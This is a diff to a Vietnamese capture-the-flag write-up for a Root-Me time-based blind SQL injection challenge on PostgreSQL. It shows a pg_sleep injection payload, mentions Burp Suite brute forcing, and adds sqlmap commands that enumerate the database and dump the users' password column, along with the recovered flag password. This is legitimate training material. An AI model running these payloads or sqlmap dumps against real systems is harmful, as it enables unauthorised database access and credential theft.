@@ -63,9 +63,13 @@ Vậy tìm được tên column ở hàng thứ 5 là password với tên bảng
 
 > payload: 1;+select+case+when+((select length(password) from users+limit+1)>1)+then+pg_sleep(20)+else+pg_sleep(0)+end+--
 
-Thử như vậy ta được length của password hàng 1 có độ dài là 13
+Thử như vậy ta được length của password hàng 1 có độ dài là 13, vì password có thể là các kí tự hoa và kí tự đặc biệt nên ta sẽ phải thử chr từ 33 đến 126.
+Dùng 2 payload với burpsuite để tìm kiếm:
 
-Nhưng bằng cách trên mình thấy bruteforce bằng burpsuite khá lâu, nên ta viết script như sau sẽ nhanh hơn nhiều:  
+![image](https://user-images.githubusercontent.com/104350480/221502821-a5ca2dc9-c0b9-4da7-9641-25ac7f8069b2.png)
+
+
+Nhưng bằng cách trên mình thấy bruteforce bằng burpsuite rất lâu, nên ta viết script như sau sẽ nhanh hơn nhiều:  
 
 ```
 import requests
@@ -97,5 +101,23 @@ Ta chuyển đổi về dạng char về text thì được : T!m3B@s3DSQL!
 
 ### Một cách khác nữa là ta dùng sql map cho nhanh, khi hiểu được cách làm r thì dùng tool thôi :(((
 
+> sqlmap -u 'http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1' --dbs
+
+![image](https://user-images.githubusercontent.com/104350480/221501331-768f805e-35f4-4e93-915d-8baffd125199.png)
+
+> sqlmap -u 'http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1' --dbms=PostgreSQL --tables --threads=10 --batch
+
+![image](https://user-images.githubusercontent.com/104350480/221501670-d408b10e-e9e3-42de-ba75-a079405918d8.png)
+
+> sqlmap -u 'http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1' --dbms=PostgreSQL -T users --columns --threads=10 --batch
+
+![image](https://user-images.githubusercontent.com/104350480/221502477-e1628c4e-5641-4f03-ab79-4707838a1325.png)
+
+
+> sqlmap -u 'http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1' --dbms=PostgreSQL -T users -C password --dump --threads=10 --batch
+
+![image](https://user-images.githubusercontent.com/104350480/221502624-cc8a2c17-34f9-489b-89e8-dca18b04de81.png)
+
+Ta cũng có được password: T!m3B@s3DSQL!
 
 
